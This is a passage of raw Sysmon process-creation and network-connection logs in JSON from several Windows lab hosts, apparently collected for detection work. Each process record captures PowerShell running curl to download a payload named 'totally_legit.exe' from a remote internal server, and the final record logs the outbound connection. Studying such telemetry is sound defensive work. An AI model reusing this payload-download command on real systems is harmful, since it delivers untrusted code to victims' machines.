"vagrant", "domain": "DESKTOP-8Q44FSM", "id": "S-1-5-18"}, "process": {"name": "curl.exe", "pe": {"file_version": "8.4.0", "company": "curl, https://curl.se/", "imphash": "bbdb9c75d95f84296d0fce2e933932e2", "original_file_name": "curl.exe", "product": "The curl executable", "description": "The curl executable"}, "entity_id": "{b14ecd17-54f3-690f-2703-000000000500}", "executable": "C:\\Windows\\System32\\curl.exe", "hash": {"sha256": "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "md5": "c84486b75d148bde935e7f8f4084a741", "sha1": "b41e5ad102f2e599cf8c2fc60219fc1259482387"}, "working_directory": "C:\\Users\\vagrant\\", "command_line": "\"C:\\Windows\\system32\\curl.exe\" -k -L -o C:/Payloads/totally_legit.exe https://10.136.5.33/payload?payloadId=1", "args": ["C:\\Windows\\system32\\curl.exe", "-k", "-L", "-o", "C:/Payloads/totally_legit.exe", "https://10.136.5.33/payload?payloadId=1"], "pid": 3664, "parent": {"executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "name": "powershell.exe", "entity_id": "{b14ecd17-54f2-690f-2603-000000000500}", "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -Command \"curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'\"", "pid": 1512, "args": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-NoProfile", "-Command", "curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'"]}}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "dcd8318d-95d4-4b47-92c0-9b7bdc2aa8b4", "id": "ad03eb5d-aaf5-44d5-b5c0-e19e6c891455", "name": "DESKTOP-8Q44FSM", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-8Q44FSM"}, "event": {"module": "sysmon", "created": "2025-11-08T14:34:29.095Z", "type": ["start", "process_start"], "kind": "event", "action": "Process Create (rule: ProcessCreate)", "provider": "Microsoft-Windows-Sysmon", "category": ["process"], "code": "1"}, "winlog": {"event_id": "1", "user": {"name": "SYSTEM", "type": "User", "identifier": "S-1-5-18", "domain": "NT AUTHORITY"}, "channel": "Microsoft-Windows-Sysmon/Operational", "task": "Process Create (rule: ProcessCreate)", "opcode": "Info", "computer_name": "DESKTOP-8Q44FSM", "process": {"pid": 1156, "thread": {"id": 3716}}, "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"IntegrityLevel": "High", "ParentUser": "DESKTOP-8Q44FSM\\vagrant", "Company": "curl, https://curl.se/", "TerminalSessionId": "0", "LogonGuid": "{b14ecd17-54e4-690f-096f-5c0000000000}", "FileVersion": "8.4.0", "LogonId": "0x5c6f09", "Product": "The curl executable", "Description": "The curl executable"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 37541}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Process Create:\nRuleName: -\nUtcTime: 2025-11-08 14:34:28.468\nProcessGuid: {4d96f8ad-54f4-690f-2a03-000000000500}\nProcessId: 864\nImage: C:\\Windows\\System32\\curl.exe\nFileVersion: 8.4.0\nDescription: The curl executable\nProduct: The curl executable\nCompany: curl, https://curl.se/\nOriginalFileName: curl.exe\nCommandLine: \"C:\\Windows\\system32\\curl.exe\" -k -L -o C:/Payloads/totally_legit.exe https://10.136.5.33/payload?payloadId=1\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: DESKTOP-4KG93DG\\vagrant\nLogonGuid: {4d96f8ad-54e4-690f-f7f4-5c0000000000}\nLogonId: 0x5CF4F7\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA1=B41E5AD102F2E599CF8C2FC60219FC1259482387,MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2\nParentProcessGuid: {4d96f8ad-54f3-690f-2903-000000000500}\nParentProcessId: 3552\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -Command \"curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'\"\nParentUser: DESKTOP-4KG93DG\\vagrant", "related": {"hash": ["b41e5ad102f2e599cf8c2fc60219fc1259482387", "c84486b75d148bde935e7f8f4084a741", "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "bbdb9c75d95f84296d0fce2e933932e2"], "user": "vagrant"}, "host": {"hostname": "DESKTOP-4KG93DG", "os": {"platform": "windows", "type": "windows", "version": "10.0", "family": "windows", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "build": "22631.2861"}, "ip": ["fe80::54fd:e63:93ce:bb23", "10.136.5.69"], "architecture": "x86_64", "mac": ["bc:24:11:10:2c:d3"], "id": "4d96f8ad-6ed7-495d-9069-5f56c2ebf694"}, "hash": {"sha256": "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "imphash": "bbdb9c75d95f84296d0fce2e933932e2", "md5": "c84486b75d148bde935e7f8f4084a741", "sha1": "b41e5ad102f2e599cf8c2fc60219fc1259482387"}, "@timestamp": "2025-11-08T14:34:28.468Z", "log": {"level": "information"}, "user": {"name": "vagrant", "domain": "DESKTOP-4KG93DG", "id": "S-1-5-18"}, "process": {"name": "curl.exe", "executable": "C:\\Windows\\System32\\curl.exe", "entity_id": "{4d96f8ad-54f4-690f-2a03-000000000500}", "working_directory": "C:\\Users\\vagrant\\", "hash": {"sha256": "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "md5": "c84486b75d148bde935e7f8f4084a741", "sha1": "b41e5ad102f2e599cf8c2fc60219fc1259482387"}, "pe": {"file_version": "8.4.0", "company": "curl, https://curl.se/", "imphash": "bbdb9c75d95f84296d0fce2e933932e2", "original_file_name": "curl.exe", "product": "The curl executable", "description": "The curl executable"}, "command_line": "\"C:\\Windows\\system32\\curl.exe\" -k -L -o C:/Payloads/totally_legit.exe https://10.136.5.33/payload?payloadId=1", "args": ["C:\\Windows\\system32\\curl.exe", "-k", "-L", "-o", "C:/Payloads/totally_legit.exe", "https://10.136.5.33/payload?payloadId=1"], "pid": 864, "parent": {"name": "powershell.exe", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "entity_id": "{4d96f8ad-54f3-690f-2903-000000000500}", "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -Command \"curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'\"", "args": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-NoProfile", "-Command", "curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'"], "pid": 3552}}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "b4008bfb-8e39-4e8e-8ad7-e585c890b879", "id": "bd065c39-423b-48a6-b74e-4c0ace0cf1cc", "name": "DESKTOP-4KG93DG", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-4KG93DG"}, "event": {"created": "2025-11-08T14:34:29.612Z", "module": "sysmon", "type": ["start", "process_start"], "kind": "event", "action": "Process Create (rule: ProcessCreate)", "provider": "Microsoft-Windows-Sysmon", "category": ["process"], "code": "1"}, "winlog": {"event_id": "1", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "Info", "task": "Process Create (rule: ProcessCreate)", "process": {"thread": {"id": 4352}, "pid": 2248}, "computer_name": "DESKTOP-4KG93DG", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"IntegrityLevel": "High", "Company": "curl, https://curl.se/", "ParentUser": "DESKTOP-4KG93DG\\vagrant", "TerminalSessionId": "0", "LogonGuid": "{4d96f8ad-54e4-690f-f7f4-5c0000000000}", "FileVersion": "8.4.0", "LogonId": "0x5cf4f7", "Product": "The curl executable", "Description": "The curl executable"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 38348}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Process Create:\nRuleName: -\nUtcTime: 2025-11-08 14:34:28.966\nProcessGuid: {6c054e7e-54f4-690f-1d03-000000000500}\nProcessId: 1216\nImage: C:\\Windows\\System32\\curl.exe\nFileVersion: 8.4.0\nDescription: The curl executable\nProduct: The curl executable\nCompany: curl, https://curl.se/\nOriginalFileName: curl.exe\nCommandLine: \"C:\\Windows\\system32\\curl.exe\" -k -L -o C:/Payloads/totally_legit.exe https://10.136.5.33/payload?payloadId=1\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: DESKTOP-Q167QR1\\vagrant\nLogonGuid: {6c054e7e-54e4-690f-d6e0-570000000000}\nLogonId: 0x57E0D6\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA1=B41E5AD102F2E599CF8C2FC60219FC1259482387,MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2\nParentProcessGuid: {6c054e7e-54f3-690f-1c03-000000000500}\nParentProcessId: 3932\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -Command \"curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'\"\nParentUser: DESKTOP-Q167QR1\\vagrant", "related": {"user": "vagrant", "hash": ["b41e5ad102f2e599cf8c2fc60219fc1259482387", "c84486b75d148bde935e7f8f4084a741", "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "bbdb9c75d95f84296d0fce2e933932e2"]}, "host": {"hostname": "DESKTOP-Q167QR1", "os": {"platform": "windows", "type": "windows", "version": "10.0", "family": "windows", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "build": "22631.2861"}, "ip": ["fe80::b392:ba9e:24f8:260e", "10.136.5.67"], "architecture": "x86_64", "mac": ["bc:24:11:9a:96:84"], "id": "6c054e7e-a5b1-4db9-8d63-3f70f302d6af"}, "hash": {"sha256": "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "imphash": "bbdb9c75d95f84296d0fce2e933932e2", "md5": "c84486b75d148bde935e7f8f4084a741", "sha1": "b41e5ad102f2e599cf8c2fc60219fc1259482387"}, "@timestamp": "2025-11-08T14:34:28.966Z", "log": {"level": "information"}, "user": {"name": "vagrant", "domain": "DESKTOP-Q167QR1", "id": "S-1-5-18"}, "process": {"working_directory": "C:\\Users\\vagrant\\", "pe": {"file_version": "8.4.0", "company": "curl, https://curl.se/", "imphash": "bbdb9c75d95f84296d0fce2e933932e2", "original_file_name": "curl.exe", "product": "The curl executable", "description": "The curl executable"}, "name": "curl.exe", "entity_id": "{6c054e7e-54f4-690f-1d03-000000000500}", "hash": {"sha256": "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "md5": "c84486b75d148bde935e7f8f4084a741", "sha1": "b41e5ad102f2e599cf8c2fc60219fc1259482387"}, "executable": "C:\\Windows\\System32\\curl.exe", "command_line": "\"C:\\Windows\\system32\\curl.exe\" -k -L -o C:/Payloads/totally_legit.exe https://10.136.5.33/payload?payloadId=1", "pid": 1216, "args": ["C:\\Windows\\system32\\curl.exe", "-k", "-L", "-o", "C:/Payloads/totally_legit.exe", "https://10.136.5.33/payload?payloadId=1"], "parent": {"name": "powershell.exe", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "entity_id": "{6c054e7e-54f3-690f-1c03-000000000500}", "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -Command \"curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'\"", "args": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-NoProfile", "-Command", "curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'"], "pid": 3932}}, "ecs": {"version": "1.12.0"}, "agent": {"id": "b6d0da7e-2d5b-408f-88d3-d607a27fb60e", "hostname": "DESKTOP-Q167QR1", "name": "DESKTOP-Q167QR1", "type": "winlogbeat", "version": "7.17.29", "ephemeral_id": "e918f62f-a141-4b32-a344-477f03b1b9ea"}, "event": {"module": "sysmon", "created": "2025-11-08T14:34:30.287Z", "type": ["start", "process_start"], "kind": "event", "action": "Process Create (rule: ProcessCreate)", "provider": "Microsoft-Windows-Sysmon", "category": ["process"], "code": "1"}, "winlog": {"event_id": "1", "user": {"identifier": "S-1-5-18", "type": "User", "domain": "NT AUTHORITY", "name": "SYSTEM"}, "task": "Process Create (rule: ProcessCreate)", "process": {"pid": 3804, "thread": {"id": 4152}}, "opcode": "Info", "computer_name": "DESKTOP-Q167QR1", "channel": "Microsoft-Windows-Sysmon/Operational", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"IntegrityLevel": "High", "Company": "curl, https://curl.se/", "ParentUser": "DESKTOP-Q167QR1\\vagrant", "TerminalSessionId": "0", "LogonId": "0x57e0d6", "FileVersion": "8.4.0", "LogonGuid": "{6c054e7e-54e4-690f-d6e0-570000000000}", "Description": "The curl executable", "Product": "The curl executable"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 36738}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Process Create:\nRuleName: -\nUtcTime: 2025-11-08 14:34:29.682\nProcessGuid: {9541e27f-54f5-690f-2203-000000000500}\nProcessId: 3152\nImage: C:\\Windows\\System32\\curl.exe\nFileVersion: 8.4.0\nDescription: The curl executable\nProduct: The curl executable\nCompany: curl, https://curl.se/\nOriginalFileName: curl.exe\nCommandLine: \"C:\\Windows\\system32\\curl.exe\" -k -L -o C:/Payloads/totally_legit.exe https://10.136.5.33/payload?payloadId=1\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: DESKTOP-5D71Q14\\vagrant\nLogonGuid: {9541e27f-54e4-690f-570a-5d0000000000}\nLogonId: 0x5D0A57\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA1=B41E5AD102F2E599CF8C2FC60219FC1259482387,MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2\nParentProcessGuid: {9541e27f-54f3-690f-2103-000000000500}\nParentProcessId: 4896\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -Command \"curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'\"\nParentUser: DESKTOP-5D71Q14\\vagrant", "related": {"user": "vagrant", "hash": ["b41e5ad102f2e599cf8c2fc60219fc1259482387", "c84486b75d148bde935e7f8f4084a741", "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "bbdb9c75d95f84296d0fce2e933932e2"]}, "host": {"id": "9541e27f-63d3-48ba-a52f-de9a0436a02f", "os": {"kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "platform": "windows", "version": "10.0", "family": "windows", "name": "Windows 11 Pro", "build": "22631.2861"}, "ip": ["fe80::bfbe:eb73:3f35:ed8b", "10.136.5.68"], "architecture": "x86_64", "mac": ["bc:24:11:f2:aa:20"], "hostname": "DESKTOP-5D71Q14"}, "hash": {"sha256": "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "imphash": "bbdb9c75d95f84296d0fce2e933932e2", "md5": "c84486b75d148bde935e7f8f4084a741", "sha1": "b41e5ad102f2e599cf8c2fc60219fc1259482387"}, "@timestamp": "2025-11-08T14:34:29.682Z", "log": {"level": "information"}, "user": {"name": "vagrant", "domain": "DESKTOP-5D71Q14", "id": "S-1-5-18"}, "process": {"working_directory": "C:\\Users\\vagrant\\", "pe": {"file_version": "8.4.0", "company": "curl, https://curl.se/", "imphash": "bbdb9c75d95f84296d0fce2e933932e2", "original_file_name": "curl.exe", "product": "The curl executable", "description": "The curl executable"}, "name": "curl.exe", "executable": "C:\\Windows\\System32\\curl.exe", "hash": {"sha256": "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "md5": "c84486b75d148bde935e7f8f4084a741", "sha1": "b41e5ad102f2e599cf8c2fc60219fc1259482387"}, "entity_id": "{9541e27f-54f5-690f-2203-000000000500}", "command_line": "\"C:\\Windows\\system32\\curl.exe\" -k -L -o C:/Payloads/totally_legit.exe https://10.136.5.33/payload?payloadId=1", "args": ["C:\\Windows\\system32\\curl.exe", "-k", "-L", "-o", "C:/Payloads/totally_legit.exe", "https://10.136.5.33/payload?payloadId=1"], "pid": 3152, "parent": {"executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "name": "powershell.exe", "entity_id": "{9541e27f-54f3-690f-2103-000000000500}", "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -Command \"curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'\"", "args": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-NoProfile", "-Command", "curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'"], "pid": 4896}}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "d07b82f0-1acc-4d97-9489-166a47073a22", "id": "43e4a97d-cdf0-42b2-8f35-6f5b1e9e1766", "name": "DESKTOP-5D71Q14", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-5D71Q14"}, "event": {"module": "sysmon", "created": "2025-11-08T14:34:30.844Z", "type": ["start", "process_start"], "kind": "event", "action": "Process Create (rule: ProcessCreate)", "provider": "Microsoft-Windows-Sysmon", "category": ["process"], "code": "1"}, "winlog": {"event_id": "1", "user": {"identifier": "S-1-5-18", "type": "User", "domain": "NT AUTHORITY", "name": "SYSTEM"}, "task": "Process Create (rule: ProcessCreate)", "opcode": "Info", "channel": "Microsoft-Windows-Sysmon/Operational", "process": {"pid": 560, "thread": {"id": 804}}, "computer_name": "DESKTOP-5D71Q14", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"IntegrityLevel": "High", "ParentUser": "DESKTOP-5D71Q14\\vagrant", "Company": "curl, https://curl.se/", "TerminalSessionId": "0", "LogonGuid": "{9541e27f-54e4-690f-570a-5d0000000000}", "LogonId": "0x5d0a57", "FileVersion": "8.4.0", "Product": "The curl executable", "Description": "The curl executable"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 38288}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:34:27.982\nProcessGuid: {b14ecd17-54f3-690f-2703-000000000500}\nProcessId: 3664\nImage: C:\\Windows\\System32\\curl.exe\nUser: DESKTOP-8Q44FSM\\vagrant\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 10.136.5.66\nSourceHostname: -\nSourcePort: 49931\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.33\nDestinationHostname: -\nDestinationPort: 443\nDestinationPortName: -", "related": {"ip": ["10.136.5.66", "10.136.5.33"], "user": "vagrant"}, "host": {"hostname": "DESKTOP-8Q44FSM", "os": {"kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "platform": "windows", "version": "10.0", "family": "windows", "name": "Windows 11 Pro", "build": "22631.2861"}, "ip": ["fe80::48f7:5d50:95ed:189a", "10.136.5.66"], "architecture": "x86_64", "mac": ["bc:24:11:45:94:8e"], "id": "b14ecd17-5d3b-4f55-baee-6ff4cabb34b4"}, "source": {"port": 49931, "ip": "10.136.5.66", "domain": "-"}, "@timestamp": "2025-11-08T14:34:27.982Z", "log": {"level": "information"}, "user": {"name": "vagrant", "domain": "DESKTOP-8Q44FSM", "id": "S-1-5-18"}, "network": {"protocol": "-", "type": "ipv4", "direction": "egress", "community_id": "1:mgQJiIJzOIinH5LqKo9Wqsnbz1M=", "transport": "tcp"}, "process": {"pid": 3664, "executable": "C:\\Windows\\System32\\curl.exe", "entity_id": "{b14ecd17-54f3-690f-2703-000000000500}", "name": "curl.exe"}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "dcd8318d-95d4-4b47-92c0-9b7bdc2aa8b4", "id": "ad03eb5d-aaf5-44d5-b5c0-e19e6c891455", "name": "DESKTOP-8Q44FSM", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-8Q44FSM"}, "event": {"module": "sysmon", "created": "2025-11-08T14:34:31.154Z", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 443, "ip": "10.136.5.33", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "task": "Network connection detected (rule: NetworkConnect)", "process": {"pid": 1156, "thread": {"id": 1884}}, "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "DESKTOP-8Q44FSM", "opcode": "Info", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 37581}}
